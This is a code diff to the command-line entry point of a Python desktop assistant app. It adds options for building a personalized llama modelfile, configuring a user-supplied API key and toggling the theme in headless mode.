@@ -2743,6 +2977,15 @@ def main(argv: Optional[List[str]] = None) -> int:
 
     cfg = ConfigManager()
     cfg.save_defaults()
+
+    if args.build_personalized_llama:
+        ok, msg = cfg.build_personalized_llama_modelfile()
+        print(msg)
+        return 0 if ok else 1
+
+    if args.api_key is not None:
+        client = UnifiedModelClient(config=cfg)
+        client.configure_byo_key(args.api_key, args.api_preset, args.api_endpoint, args.api_model)
 
     if args.activate_license:
         ok, msg = LicenseManager.verify_key(args.activate_license)
@@ -2784,6 +3027,14 @@ def main(argv: Optional[List[str]] = None) -> int:
 
     engine = BajrangEngine(config=cfg)
 
+    if args.toggle_theme and (args.headless or not os.environ.get("WAYLAND_DISPLAY") and not os.environ.get("DISPLAY")):
+        cur = cfg.settings.get("theme_mode", "dark")
+        nxt = "light" if cur == "dark" else "dark"
+        cfg.settings["theme_mode"] = nxt
+        cfg.save_settings()
+        print(f"Theme switched to: {nxt}")
+        return 0
+
     if args.kill and (args.headless or not os.environ.get("WAYLAND_DISPLAY") and not os.environ.get("DISPLAY")):
         print(engine.trigger_emergency_kill())
         return 0
@@ -2801,6 +3052,8 @@ def main(argv: Optional[List[str]] = None) -> int:
     gtk_argv = [sys.argv[0]]
     if args.toggle:
         gtk_argv.append("--toggle")
+    if args.toggle_theme:
+        gtk_argv.append("--toggle-theme")
     if args.voice:
         gtk_argv.append("--voice")
     if args.kill:
